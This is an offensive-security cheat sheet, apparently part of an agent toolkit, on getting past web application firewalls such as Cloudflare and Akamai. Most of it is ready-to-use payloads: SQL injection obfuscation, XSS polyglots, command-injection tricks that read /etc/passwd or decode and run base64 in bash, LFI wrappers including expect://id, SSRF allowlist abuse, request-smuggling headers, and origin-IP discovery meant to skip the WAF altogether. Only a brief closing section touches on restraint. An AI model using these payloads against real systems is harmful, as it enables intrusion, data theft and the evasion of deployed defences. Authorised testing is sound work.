# WAF / Filter Bypass — universal toolkit

> Cloudflare, AWS WAF, Akamai, Imperva, F5, Fastly, ModSecurity. Layer these tricks until something passes.

---

## STAGE 1 — IDENTIFY THE WAF

```bash
wafw00f https://target.com
nuclei -t http/technologies/waf-detect.yaml
# Manually inspect Server, X-CDN, Set-Cookie (e.g. __cfduid, ak_bmsc, _abck)
```

Each WAF has signature blocks; knowing the WAF lets you target known bypass families.

---

## STAGE 2 — ENCODING / OBFUSCATION

### URL encoding
- `%27` for `'`, `%22` for `"`, `%3C` for `<`, `%3E` for `>`, `%2F` for `/`
- Double encode: `%2527` (decoded once -> `%27`, decoded again -> `'`)
- Triple encode for nested decoders

### Unicode / UTF-8 / UTF-7 / UTF-16
- `<` instead of `<`
- Mixed-case Unicode equivalents (`Ⓐ`, `①`, fullwidth `／`)
- HTML entities: `&lt;`, `&#x3c;`, `&#60;`
- HTML5 named entities: `&commat;` for `@`

### Base64 / hex / octal
- For URL params accepted as base64: encode payload, watch decode chain
- Octal IPs in SSRF: `0177.0.0.1` for 127.0.0.1
- Decimal IPs: `2130706433`

### Comment injection
- SQL: `/**/`, `/*!50000 ... */` (MySQL versioned), `/*!UNION*/`
- HTML: `<!-- ... -->` between tags
- JS: `/* */` between tokens

### Whitespace
- Tab `%09`, newline `%0a`, CR `%0d`, vertical tab `%0b`, form feed `%0c`
- Many WAFs check for spaces but allow other whitespace
- Use `\f`, `\v` in JSON values

---

## STAGE 3 — HTTP SMUGGLING / PROTOCOL TRICKS

### Header case / duplication
- `Content-Length: 5\r\nContent-length: 10`
- `Transfer-Encoding: chunked\r\nTransfer-Encoding: x`
- `X-Forwarded-For: 1.1.1.1\r\nX-Forwarded-For: 127.0.0.1`

### Method override
```
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
X-HTTP-Method: PATCH
```
Or `_method=PUT` in body.

### Path normalization
- `/admin/../user` -> may bypass path-based ACL
- `/admin%2Fconfig` (URL-encoded slash)
- `/admin;/config`, `/admin/.;/config`
- Trailing dot: `/admin.`
- `..%2f`, `..%252f`, `..%5c` (Windows backslash)

### HTTP/2 cleartext upgrade
`Upgrade: h2c` -> bypass front-end auth on some load balancers.

---

## STAGE 4 — PAYLOAD-SPECIFIC

### SQLi (delegate to sqli-hunter-agent for deep)
- `UN/**/ION` (split keyword)
- `UNION%23\nSELECT` (with comment + newline)
- `UnIoN sElEcT` (case)
- `UNION/*!12345*/SELECT` (versioned MySQL comment)
- `'||(SELECT...)||'` (concat instead of UNION)
- `' AND SLEEP(5)-- -` ("-- -" prevents "--" SP block)
- `0x{hex}` instead of `'string'`
- `CHAR(65,66,67)` instead of `'ABC'`

### XSS (delegate to xss-hunter-agent for deep)
- `<sCRipT>`, `<script\x09>`, `<script%2F>` (case + whitespace)
- Tag-less: `'-alert(1)-'`, `<svg/onload=alert(1)>`, `<input autofocus onfocus=alert(1)>`
- HTML entities: `&#x3c;script&#x3e;`
- JS template literals: `` `${alert(1)}` ``
- Polyglots: ``javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/`/+/onmouseover=1/+/[*/[]/+alert(1)//'>``
- Mutation XSS: `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p>`

### RCE / Command injection
- `;`, `|`, `&&`, `&`, newline `%0a`
- Wildcards: `/???/??t /etc/passwd` (= `/bin/cat`)
- Variable expansion: `cat /e${IFS}tc/passwd` (won't work but tricks `${PATH}` for shell variations)
- `$IFS$9` instead of space
- Backticks vs `$()`
- Base64 + decode: `bash -c $(echo "..." | base64 -d)`
- Hex: `\x73\x68` for `sh`
- Concat: `who"a"mi`

### File path / LFI
- `../`, `..\\`, `..%2f`, `..%5c`, `....//` (filter strips `../` once)
- `/etc/passwd%00.png` (null byte, older Java/PHP)
- Wrappers: `php://filter/convert.base64-encode/resource=index`, `data://text/plain;base64,...`, `expect://id`

### SSRF (full reference: ssrf-killchain.md)
- IPv6 / decimal / octal / mixed
- Allowlist domain abuse: `evil.com#@127.0.0.1/`
- DNS rebinding via `1u.ms` / `rbndr.us`
- IDN homograph: `①②⑦.0.0.1`

---

## STAGE 5 — TIMING / DISTRIBUTION

### Lower request rate
WAFs often block on volume. Slow request bursts (~1/sec) often bypass.

### Distribute IPs
Use Burp Collaborator's pool, or rotate `X-Forwarded-For`/Cloud-WAF custom client-IP header.

### Origin IP discovery
- Historical DNS: `securitytrails`, `dnshistory`
- Censys / Shodan TLS cert search: `ssl.cert.subject.cn:"target.com"`
- Subdomain enum may reveal `origin.target.com`, `direct.target.com`, `*.acme.target.com`
- If found and they don't enforce Host header validation, hit origin direct -> bypass WAF entirely

### Sub-WAF tier
Some WAFs only protect `www.` and forget `api.` or `legacy.` — test all subdomains, not just main.

---

## STAGE 6 — ESCAPING JSON / XML / OTHER PARSERS

### JSON
- Duplicate keys: `{"a":"safe","a":"<script>"}` (parser-dependent which is read)
- Unicode in keys: `{"<script>": "x"}`
- Numeric overflow: `{"id":99999999999999999999}` (parser confusion)

### XML
- CDATA: `<![CDATA[<script>...]]>` — bypasses HTML filters in mixed flows
- Encoded entities: `&#x3c;script&#x3e;`
- DTD comment injection

### YAML
- Anchors / aliases / merge keys to confuse policy
- `!str` / `!!python/object/apply` for unsafe loads (delegate to deserialization)

---

## STAGE 7 — BURP / TURBO INTRUDER WORKFLOWS

- **BackslashPoweredScanner** (Burp ext) — auto-detects parser confusion
- **Turbo Intruder** — sends thousands of variants, looks at response diff
- **Param Miner** — finds unkeyed inputs (cache poisoning)
- **HTTP Request Smuggler** — Kettle's smuggling automation

---

## STAGE 8 — DON'T

- Don't disable rate limits at scale on prod
- Don't sustain high-traffic fuzzing on a target without explicit DoS-allowed clause
- Don't use real victim data as test value

If a payload triggers a WAF block, back off, reduce noise, try a single different vector before resuming.
